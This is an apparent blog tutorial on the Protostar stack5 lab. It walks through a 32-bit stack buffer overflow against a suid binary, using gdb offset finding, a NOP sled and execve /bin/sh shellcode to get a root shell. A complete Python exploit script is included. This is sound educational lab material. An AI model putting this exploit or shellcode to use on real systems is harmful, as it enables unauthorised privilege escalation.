<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.24.0 by Michael Rose
  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>Buffer Overflow Examples, Code execution by shellcode injection - protostar stack5 - 0xRick’s Blog</title>
<meta name="description" content="In this binary exploitation post I show a simple buffer overflow exploited to get code execution by shellcode injection in case the stack is executable. (x32)">


  <meta name="author" content="0xRick">
  
  <meta property="article:author" content="0xRick">
  


<meta property="og:type" content="article">
<meta property="og:locale" content="en">
<meta property="og:site_name" content="0xRick's Blog">
<meta property="og:title" content="Buffer Overflow Examples, Code execution by shellcode injection - protostar stack5">
<meta property="og:url" content="https://0xrick.github.io/binary-exploitation/bof5/">


  <meta property="og:description" content="In this binary exploitation post I show a simple buffer overflow exploited to get code execution by shellcode injection in case the stack is executable. (x32)">





  <meta name="twitter:site" content="@ahm3d_h3sham">
  <meta name="twitter:title" content="Buffer Overflow Examples, Code execution by shellcode injection - protostar stack5">
  <meta name="twitter:description" content="In this binary exploitation post I show a simple buffer overflow exploited to get code execution by shellcode injection in case the stack is executable. (x32)">
  <meta name="twitter:url" content="https://0xrick.github.io/binary-exploitation/bof5/">

  
    <meta name="twitter:card" content="summary">
    
  

  



  <meta property="article:published_time" content="2019-01-17T07:00:00+02:00">






<link rel="canonical" href="https://0xrick.github.io/binary-exploitation/bof5/">




<script type="application/ld+json">
  {
    "@context": "https://schema.org",
    
      "@type": "Person",
      "name": "0xRick",
      "url": "https://0xrick.github.io/"
    
  }
</script>







<!-- end _includes/seo.html -->




<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">
<link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
<noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css"></noscript>



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

  </head>

  <body class="layout--single wide">
    <nav class="skip-links">
  <ul>
    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
  </ul>
</nav>

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
        <a class="site-title" href="/">
          0xRick's Blog
          
        </a>
        <ul class="visible-links">
<li class="masthead__menu-item">
              <a href="/about">About</a>
            </li>
<li class="masthead__menu-item">
              <a href="/categories">Categories</a>
            </li>
<li class="masthead__menu-item">
              <a href="/tags">Tags</a>
            </li>
</ul>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>


    <div class="initial-content">
      



<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  
    <div class="author__avatar">
      
        <img src="/images/avatar.jpg" alt="0xRick" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">0xRick</h3>
    
    
      <div class="author__bio" itemprop="description">
        

      </div>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      
        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Somewhere between 1's and 0's</span>
        </li>
      

      
        
          
            <li><a href="/" rel="nofollow noopener noreferrer"><i class="fas fa-fw fa-home" aria-hidden="true"></i><span class="label">Home Page</span></a></li>
          
        
          
            <li><a href="https://twitter.com/ahm3d_h3sham" rel="noopener noreferrer" target="_blank"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
          
        
          
            <li><a href="https://github.com/0xRick" rel="noopener noreferrer" target="_blank"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">Github</span></a></li>
          
        
          
            <li><a href="https://www.buymeacoffee.com/VGEfcAqvn" rel="noopener noreferrer" target="_blank"><i class="fas fa-fw fa-link" aria-hidden="true"></i><span class="label">buymeacoffee</span></a></li>
          
        
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>
 
  
  </div>


  <article class="page h-entry" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="Buffer Overflow Examples, Code execution by shellcode injection - protostar stack5">
    <meta itemprop="description" content="Buffer Overflow Examples, Code execution by shellcode injection - protostar stack5IntroductionHey I’m back with another Buffer Overflow article and today we are going to do a really interesting exploit , Today we will finally escalate privileges using a vulnerable suid binary (you can know more about that by reading the first buffer overflow article) , I will also cover some interesting topics to fully understand this exploit. This is also the most realistic exploit so far. All the previous exploits wanted us to change a variable , execute a function .. stuff that are more like CTF but this time we have a realistic situation , Without wasting more time let’s just jump right in.Read the previous articles first , if you haven’t done yet../Stack5We have the source like all the previous challenges but this time it’s actually not important.#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main(int argc, char **argv){ char buffer[64]; gets(buffer);}It just takes our input and stores it in the buffer , it doesn’t even tell us about the buffer size. What about char buffer[64]; ?  like stack4 if we tried 64 chars it won’t even crash. with that being said let’s start.As always we will start by finding out if the binary vulnerable or not (yea we already know that but it’s an important enumeration step)python -c &quot;print 'A' * 100&quot; | ./stack5Segmentation fault. So it crashes before 100 chars , next step is to know where exactly does it crash. We will use metasploit pattern_create and pattern_offset , I explained how does this work in stack3./pattern_create.rb -l 100Then we will run gdb and create a break point at main() , run the program after the break point we make it continue then pass our pattern :break mainruncIt crashes at 0x63413563 , now we will use pattern_offset./pattern_offset.rb -q 63413563And we get exact match at offset 76. As I said before we will exploit this binary to get a root shell , but how to know if it’s a suid binary or not ? we can simply use find to know thatfind /opt/protostar/bin/ -perm -4000 | grep stack5And we get /opt/protostar/bin/stack5 , if it wasn’t a suid binary we wouldn’t get any output. If you are just searching for suid binaries you can remove the grep command and it will list all suid binaries in the specified directory.Fun with gdb , finding EIPNow let’s run gdb again and start getting useful information. Before we start I have to say that the memory addresses may differ , so mine won’t be the same as yours. Last time we have overwritten the EIP address with the address of win() function . This time we don’t have a function to execute ,we have to find the address of the EIP and make it point to our “evil input” (shellcode), I will explain in a moment.We will set the disassembly flavor to intelset disassembly-flavor intelThen we will disassemble the main functiondisassemble mainBy looking at that we can identify the best place to set our break point , and it’s gonna be before the leave instruction , leave is right before the return instruction , next to leave we see the address 0x080483d9 so we will type :break *0x080483d9Then we will run the program and pass any input , many A’s is always good It will execute and stop at the breakpoint , by typing info frame we can get the EIP addressinfo frameThe last 2 lines show saved registers : eip at 0xbffff77cAnother way to get the buffer sizeLet’s take a break and take a quick look at another way to get the buffer size , I wanted to show this quickly because we have already done 50 % of it ..Metasploit is cool but what if we don’t have metasploit in some situation ? We can do it manually by calculating the distance between the buffer start address and the EIP address , We have already got the EIP address so let’s get the start of the buffer.If we type x/24wx $esp it will show us (x/) 24 (24wx) words at the top of the stack ($esp).x/24wx $espAt the second line we see this address 0xbffff730 and it holds values of 0x41414141 and we already know that 41 is the hex of “A” which was our input to the program so we know that this address is where the buffer starts. We know that the buffer comes first then the EIP so the EIP’s address is greater than the buffer’s address. We will substract them from each other:p/d 0xbffff77c - 0xbffff730And we get 76 , the same result we got using metasploit. That was another practical way to find the buffer’s size.Idea of the exploitbefore we build our exploit let’s just understand the idea of the exploit. we will fill the buffer with “A” as always , we will reach the EIP and overwrite it with a new address that points to our shell code (4 bytes after), then we will add something called NOP (No Operation) , then finally the shellcode. Let’s breakdown everything.ShellCodeSo what’s a shellcode ? Simply it’s a piece of code (“written in hex in our situation”) that we use as a payload to execute something . /bin/sh for example. And this binary is suid … so if we execute shellcode that executes /bin/sh with the binary we will get a root shell.You can get shellcodes from shell-storm or from exploit-db , of course there are a lot of other resources , I’m just giving examples.This is the shellcode we are going to use for this challenge :\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80This shellcode executes /bin/shNOP (No Operation)Basically no operation is used to make sure that our exploit doesn’t fail , because we won’t always point to the right address , so we add stuff that doesn’t do anything and we point to them , Then when the program executes it will reach those NOPs and keeps executing them (does nothing) until it reaches the shellcode.Building the exploitIn the last challenges a single python print statement solved it. This time it will be a mess so we will create a small exploit with python.First thing we will import a module called struct , I will explain why in a moment.import structThen we will create a variable the holds the padding (the chars to fill the buffer)pad = &quot;\x41&quot; * 76After it fills the buffer it will hit the EIP , we need the new EIP address that we will assign , as I said above we need it to be the address of the following instruction (4 bytes after the original EIP address) so it will be 0xbffff77c + 4 , google can simply give you the answer :D . it will be 0xbffff780 . We will add that value to a variable but remember we need it in reverse , That’s why struct is important. if you do import struct;struct.pack(&quot;I&quot; , 0xbffff780) from the python interpreter it will print \x80\xf7\xff\xbf , it makes life easier :DEIP = struct.pack(&quot;I&quot;, 0xbffff780)Then comes our shellcodeshellcode = &quot;\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80&quot;`Last thing is the NOP , it can be anything , so 100 chars will be goodNOP = &quot;\x90&quot; * 100Ok our exploit is ready , we just need to print out the final payload so :print pad + EIP + NOP + shellcodeLet’s take a look at the script :import structpad = &quot;\x41&quot; * 76EIP = struct.pack(&quot;I&quot;, 0xbffff780)shellcode = &quot;\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80&quot;NOP = &quot;\x90&quot; * 100print pad + EIP + NOP + shellcodeApplying the exploitNow it’s show time ! let’s test it out.python /tmp/stack5.py | ./stack5And we got a root shell !That’s it , Feedback is appreciated !Don’t forget to read the previous articles , Tweet about the article if you liked it , follow on twitter @Ahm3d_H3shamThanks for reading.Previous Binary Exploitation article : Buffer Overflow Examples, Taking control of the instruction pointer - protostar stack4Next Binary Exploitation article : Buffer Overflow Examples, Bypassing non-executable stack by re2libc - protostar stack6">
    <meta itemprop="datePublished" content="2019-01-17T07:00:00+02:00">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title p-name" itemprop="headline">
            <a href="https://0xrick.github.io/binary-exploitation/bof5/" class="u-url" itemprop="url">Buffer Overflow Examples, Code execution by shellcode injection - protostar stack5
</a>
          </h1>
          

  <p class="page__meta">
    
      
      <span class="page__meta-date">
        <i class="far fa-calendar-alt" aria-hidden="true"></i>
        
        <time datetime="2019-01-17T07:00:00+02:00">January 17, 2019</time>
      </span>
    

    <span class="page__meta-sep"></span>

    
      
      

      <span class="page__meta-readtime">
        <i class="far fa-clock" aria-hidden="true"></i>
        
          7 minute read
        
      </span>
    
  </p>


        </header>
      

      <section class="page__content e-content" itemprop="text">
        <div>
          <style>
              #carbonads {
                border: 1px solid black;
                border-radius: 7px;
                border-spacing: 7px;
                display: block;
                overflow: hidden;
                padding: 1em;
                line-height: 1.5;
              }
              #carbonads span {
                position: relative;
                display: block;
                overflow: hidden;
              }
              .carbon-img img {
                display: block;
                float: left;
              }
              .carbon-text {
                display: block;
                font-size: .9em;
                text-align: end;
              }
              .carbon-poweredby {
                display: block;
                font-size: .8em;
                float: right;
                line-height: 1;
                letter-spacing: 1px;
                }
                </style>
                <br>   
          <script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&amp;placement=0xrickgithubio" id="_carbonads_js"></script> 
                <br>
        </div>
        
          <aside class="sidebar__right ">
            <nav class="toc">
              <header><h4 class="nav__title">
<i class="fas fa-file-alt"></i> Contents</h4></header>
              <ul class="toc__menu"><li>
<a href="#buffer-overflow-examples-code-execution-by-shellcode-injection---protostar-stack5">Buffer Overflow Examples, Code execution by shellcode injection - protostar stack5</a><ul>
<li><a href="#introduction">Introduction</a></li>
<li><a href="#stack5">./Stack5</a></li>
<li><a href="#fun-with-gdb--finding-eip">Fun with gdb , finding EIP</a></li>
<li><a href="#another-way-to-get-the-buffer-size">Another way to get the buffer size</a></li>
<li><a href="#idea-of-the-exploit">Idea of the exploit</a></li>
<li><a href="#shellcode">ShellCode</a></li>
<li><a href="#nop-no-operation">NOP (No Operation)</a></li>
<li><a href="#building-the-exploit">Building the exploit</a></li>
<li><a href="#applying-the-exploit">Applying the exploit</a></li>
</ul>
</li></ul>

            </nav>
          </aside>
        
        <h1 id="buffer-overflow-examples-code-execution-by-shellcode-injection---protostar-stack5">Buffer Overflow Examples, Code execution by shellcode injection - protostar stack5</h1>

<h2 id="introduction">Introduction</h2>
<p>Hey I’m back with another Buffer Overflow article and today we are going to do a really interesting exploit , Today we will finally escalate privileges using a vulnerable suid binary (you can know more about that by reading the <a href="/binary-exploitation/bof1/">first buffer overflow article</a>) , I will also cover some interesting topics to fully understand this exploit. This is also the most realistic exploit so far. All the previous exploits wanted us to change a variable , execute a function .. stuff that are more like CTF but this time we have a realistic situation , Without wasting more time let’s just jump right in.<br>
Read the <a href="/categories">previous articles</a> first , if you haven’t done yet.<br>
<br><img src="/images/binary-exploitation/BOF5/0.png" alt="" class="align-center"><br><br></p>

<h2 id="stack5">./Stack5</h2>
<p>We have the source like all the previous challenges but this time it’s actually not important.<br></p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
<span class="p">{</span>
 <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>

 <span class="n">gets</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>
<p>It just takes our input and stores it in the buffer , it doesn’t even tell us about the buffer size. What about <code class="language-plaintext highlighter-rouge">char buffer[64];</code> ?  like <a href="/binary-exploitation/bof4/">stack4</a> if we tried 64 chars it won’t even crash. with that being said let’s start.<br>
As always we will start by finding out if the binary vulnerable or not (yea we already know that but it’s an important enumeration step)
<code class="language-plaintext highlighter-rouge">python -c "print 'A' * 100" | ./stack5</code>
<br><img src="/images/binary-exploitation/BOF5/1.png" alt="" class="align-center"><br><br>
Segmentation fault. So it crashes before 100 chars , next step is to know where exactly does it crash. We will use metasploit <code class="language-plaintext highlighter-rouge">pattern_create</code> and <code class="language-plaintext highlighter-rouge">pattern_offset</code> , I explained how does this work in <a href="/binary-exploitation/bof3">stack3</a>
<code class="language-plaintext highlighter-rouge">./pattern_create.rb -l 100</code>
<br><img src="/images/binary-exploitation/BOF5/2.png" alt="" class="align-center"><br><br>
Then we will run gdb and create a break point at <code class="language-plaintext highlighter-rouge">main()</code> , <code class="language-plaintext highlighter-rouge">run</code> the program after the break point we make it continue then pass our pattern :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>break main
run
c
</code></pre></div></div>
<p><br><img src="/images/binary-exploitation/BOF5/3.png" alt="" class="align-center"><br><br>
It crashes at <code class="language-plaintext highlighter-rouge">0x63413563</code> , now we will use <code class="language-plaintext highlighter-rouge">pattern_offset</code>
<code class="language-plaintext highlighter-rouge">./pattern_offset.rb -q 63413563</code>
<br><img src="/images/binary-exploitation/BOF5/4.png" alt="" class="align-center"><br><br>
And we get exact match at offset 76. As I said before we will exploit this binary to get a root shell , but how to know if it’s a suid binary or not ? we can simply use <code class="language-plaintext highlighter-rouge">find</code> to know that
<code class="language-plaintext highlighter-rouge">find /opt/protostar/bin/ -perm -4000 | grep stack5</code>
<br><img src="/images/binary-exploitation/BOF5/5.png" alt="" class="align-center"><br><br>
And we get <code class="language-plaintext highlighter-rouge">/opt/protostar/bin/stack5</code> , if it wasn’t a suid binary we wouldn’t get any output. If you are just searching for suid binaries you can remove the <code class="language-plaintext highlighter-rouge">grep</code> command and it will list all suid binaries in the specified directory.<br></p>

<h2 id="fun-with-gdb--finding-eip">Fun with gdb , finding EIP</h2>
<p>Now let’s run gdb again and start getting useful information. Before we start I have to say that the memory addresses may differ , so mine won’t be the same as yours. Last time we have overwritten the EIP address with the address of <code class="language-plaintext highlighter-rouge">win()</code> function . This time we don’t have a function to execute ,we have to find the address of the EIP and make it point to our “evil input” (shellcode), I will explain in a moment.<br>
We will set the disassembly flavor to intel
<code class="language-plaintext highlighter-rouge">set disassembly-flavor intel</code>
Then we will disassemble the main function
<code class="language-plaintext highlighter-rouge">disassemble main</code>
<br><img src="/images/binary-exploitation/BOF5/6.png" alt="" class="align-center"><br><br>
By looking at that we can identify the best place to set our break point , and it’s gonna be before the <code class="language-plaintext highlighter-rouge">leave</code> instruction , <code class="language-plaintext highlighter-rouge">leave</code> is right before the <code class="language-plaintext highlighter-rouge">return</code> instruction , next to <code class="language-plaintext highlighter-rouge">leave</code> we see the address <code class="language-plaintext highlighter-rouge">0x080483d9</code> so we will type :
<code class="language-plaintext highlighter-rouge">break *0x080483d9</code>
<br><img src="/images/binary-exploitation/BOF5/7.png" alt="" class="align-center"><br><br>
Then we will run the program and pass any input , many A’s is always good 
<br><img src="/images/binary-exploitation/BOF5/8.png" alt="" class="align-center"><br><br>
It will execute and stop at the breakpoint , by typing <code class="language-plaintext highlighter-rouge">info frame</code> we can get the EIP address
<code class="language-plaintext highlighter-rouge">info frame</code>
<br><img src="/images/binary-exploitation/BOF5/9.png" alt="" class="align-center"><br><br>
The last 2 lines show saved registers : eip at <code class="language-plaintext highlighter-rouge">0xbffff77c</code></p>

<h2 id="another-way-to-get-the-buffer-size">Another way to get the buffer size</h2>
<p>Let’s take a break and take a quick look at another way to get the buffer size , I wanted to show this quickly because we have already done 50 % of it ..<br>
Metasploit is cool but what if we don’t have metasploit in some situation ? We can do it manually by calculating the distance between the buffer start address and the EIP address , We have already got the EIP address so let’s get the start of the buffer.<br>
If we type <code class="language-plaintext highlighter-rouge">x/24wx $esp</code> it will show us (<code class="language-plaintext highlighter-rouge">x/</code>) 24 (<code class="language-plaintext highlighter-rouge">24wx</code>) words at the top of the stack (<code class="language-plaintext highlighter-rouge">$esp</code>).<br>
<code class="language-plaintext highlighter-rouge">x/24wx $esp</code>
<br><img src="/images/binary-exploitation/BOF5/10.png" alt="" class="align-center"><br><br>
At the second line we see this address <code class="language-plaintext highlighter-rouge">0xbffff730</code> and it holds values of <code class="language-plaintext highlighter-rouge">0x41414141</code> and we already know that 41 is the hex of “A” which was our input to the program so we know that this address is where the buffer starts. We know that the buffer comes first then the EIP so the EIP’s address is greater than the buffer’s address. We will substract them from each other:
<code class="language-plaintext highlighter-rouge">p/d 0xbffff77c - 0xbffff730</code>
<br><img src="/images/binary-exploitation/BOF5/11.png" alt="" class="align-center"><br><br>
And we get 76 , the same result we got using metasploit. That was another practical way to find the buffer’s size.<br></p>

<h2 id="idea-of-the-exploit">Idea of the exploit</h2>
<p>before we build our exploit let’s just understand the idea of the exploit. we will fill the buffer with “A” as always , we will reach the EIP and overwrite it with a new address that points to our shell code (4 bytes after), then we will add something called NOP (No Operation) , then finally the shellcode. Let’s breakdown everything.<br></p>

<h2 id="shellcode">ShellCode</h2>
<p>So what’s a shellcode ? Simply it’s a piece of code (“written in hex in our situation”) that we use as a payload to execute something . <code class="language-plaintext highlighter-rouge">/bin/sh</code> for example. And this binary is suid … so if we execute shellcode that executes <code class="language-plaintext highlighter-rouge">/bin/sh</code> with the binary we will get a root shell.<br>
You can get shellcodes from <a href="http://shell-storm.org/shellcode/" target="_blank" rel="noopener noreferrer">shell-storm</a> or from <a href="https://www.exploit-db.com/" target="_blank" rel="noopener noreferrer">exploit-db</a> , of course there are a lot of other resources , I’m just giving examples.<br>
This is the <a href="https://www.exploit-db.com/exploits/13357" target="_blank" rel="noopener noreferrer">shellcode</a> we are going to use for this challenge :</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>\<span class="n">x31</span>\<span class="n">xc0</span>\<span class="n">x31</span>\<span class="n">xdb</span>\<span class="n">xb0</span>\<span class="n">x06</span>\<span class="n">xcd</span>\<span class="n">x80</span>\<span class="n">x53</span>\<span class="n">x68</span><span class="o">/</span><span class="n">tty</span>\<span class="n">x68</span><span class="o">/</span><span class="n">dev</span>\<span class="n">x89</span>\<span class="n">xe3</span>\<span class="n">x31</span>\<span class="n">xc9</span>\<span class="n">x66</span>\<span class="n">xb9</span>\<span class="n">x12</span>\<span class="n">x27</span>\<span class="n">xb0</span>\<span class="n">x05</span>\<span class="n">xcd</span>\<span class="n">x80</span>\<span class="n">x31</span>\<span class="n">xc0</span>\<span class="n">x50</span>\<span class="n">x68</span><span class="o">//</span><span class="n">sh</span>\<span class="n">x68</span><span class="o">/</span><span class="nb">bin</span>\<span class="n">x89</span>\<span class="n">xe3</span>\<span class="n">x50</span>\<span class="n">x53</span>\<span class="n">x89</span>\<span class="n">xe1</span>\<span class="n">x99</span>\<span class="n">xb0</span>\<span class="n">x0b</span>\<span class="n">xcd</span>\<span class="n">x80</span>
</code></pre></div></div>
<p>This shellcode executes <code class="language-plaintext highlighter-rouge">/bin/sh</code></p>

<h2 id="nop-no-operation">NOP (No Operation)</h2>
<p>Basically no operation is used to make sure that our exploit doesn’t fail , because we won’t always point to the right address , so we add stuff that doesn’t do anything and we point to them , Then when the program executes it will reach those NOPs and keeps executing them (does nothing) until it reaches the shellcode.<br></p>

<h2 id="building-the-exploit">Building the exploit</h2>
<p>In the last challenges a single python print statement solved it. This time it will be a mess so we will create a small exploit with python.<br>
First thing we will import a module called struct , I will explain why in a moment.<br>
<code class="language-plaintext highlighter-rouge">import struct</code>
Then we will create a variable the holds the padding (the chars to fill the buffer)
<code class="language-plaintext highlighter-rouge">pad = "\x41" * 76</code>
After it fills the buffer it will hit the EIP , we need the new EIP address that we will assign , as I said above we need it to be the address of the following instruction (4 bytes after the original EIP address) so it will be <code class="language-plaintext highlighter-rouge">0xbffff77c + 4</code> , google can simply give you the answer :D . it will be <code class="language-plaintext highlighter-rouge">0xbffff780</code> . We will add that value to a variable but remember we need it in reverse , That’s why struct is important. if you do <code class="language-plaintext highlighter-rouge">import struct;struct.pack("I" , 0xbffff780)</code> from the python interpreter it will print <code class="language-plaintext highlighter-rouge">\x80\xf7\xff\xbf</code> , it makes life easier :D
<br><code class="language-plaintext highlighter-rouge">EIP = struct.pack("I", 0xbffff780)</code>
<br>Then comes our shellcode</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">shellcode</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68</span><span class="s">/tty</span><span class="se">\x68</span><span class="s">/dev</span><span class="se">\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68</span><span class="s">//sh</span><span class="se">\x68</span><span class="s">/bin</span><span class="se">\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80</span><span class="s">"</span><span class="err">`</span>
</code></pre></div></div>
<p>Last thing is the NOP , it can be anything , so 100 chars will be good
<br><code class="language-plaintext highlighter-rouge">NOP = "\x90" * 100</code>
<br>Ok our exploit is ready , we just need to print out the final payload so :
<br><code class="language-plaintext highlighter-rouge">print pad + EIP + NOP + shellcode</code>
<br>Let’s take a look at the script :</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">struct</span>
<span class="n">pad</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x41</span><span class="s">"</span> <span class="o">*</span> <span class="mi">76</span>
<span class="n">EIP</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"I"</span><span class="p">,</span> <span class="mh">0xbffff780</span><span class="p">)</span>
<span class="n">shellcode</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68</span><span class="s">/tty</span><span class="se">\x68</span><span class="s">/dev</span><span class="se">\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68</span><span class="s">//sh</span><span class="se">\x68</span><span class="s">/bin</span><span class="se">\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80</span><span class="s">"</span>
<span class="n">NOP</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x90</span><span class="s">"</span> <span class="o">*</span> <span class="mi">100</span>
<span class="k">print</span> <span class="n">pad</span> <span class="o">+</span> <span class="n">EIP</span> <span class="o">+</span> <span class="n">NOP</span> <span class="o">+</span> <span class="n">shellcode</span>
</code></pre></div></div>
<p><br><img src="/images/binary-exploitation/BOF5/12.png" alt="" class="align-center"><br><br></p>

<h2 id="applying-the-exploit">Applying the exploit</h2>
<p>Now it’s show time ! let’s test it out.<br>
<code class="language-plaintext highlighter-rouge">python /tmp/stack5.py | ./stack5</code>
<br><img src="/images/binary-exploitation/BOF5/13.png" alt="" class="align-center"><br><br>
And we got a root shell !</p>

<p><br>That’s it , Feedback is appreciated !
<br>Don’t forget to read the <a href="/categories">previous articles</a> , Tweet about the article if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham" target="_blank" rel="noopener noreferrer">@Ahm3d_H3sham</a>
<br>Thanks for reading.<br></p>

<p>Previous Binary Exploitation article : <a href="/binary-exploitation/bof4/">Buffer Overflow Examples, Taking control of the instruction pointer - protostar stack4</a>
<br>Next Binary Exploitation article : <a href="/binary-exploitation/bof6/">Buffer Overflow Examples, Bypassing non-executable stack by re2libc - protostar stack6</a></p>


        
      </section>

      <footer class="page__meta">
        
        


        

  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2019-01-17T07:00:00+02:00">January 17, 2019</time></p>


      </footer>

      

      
  <nav class="pagination">
    
      <a href="/binary-exploitation/bof4/" class="pagination--pager" title="Buffer Overflow Examples, Taking control of the instruction pointer - protostar stack4
">Previous</a>
    
    
      <a href="/hack-the-box/secnotes/" class="pagination--pager" title="Hack The Box - SecNotes
">Next</a>
    
  </nav>

    </div>

    
  </article>

  
  
</div>
    </div>

    

    <div id="footer" class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
    <ul class="social-icons">
      
  
      
  
      
    </ul>
  </div>
      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>







  <!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-97164925-2"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-97164925-2', { 'anonymize_ip': false});
</script>









  </body>
</html>
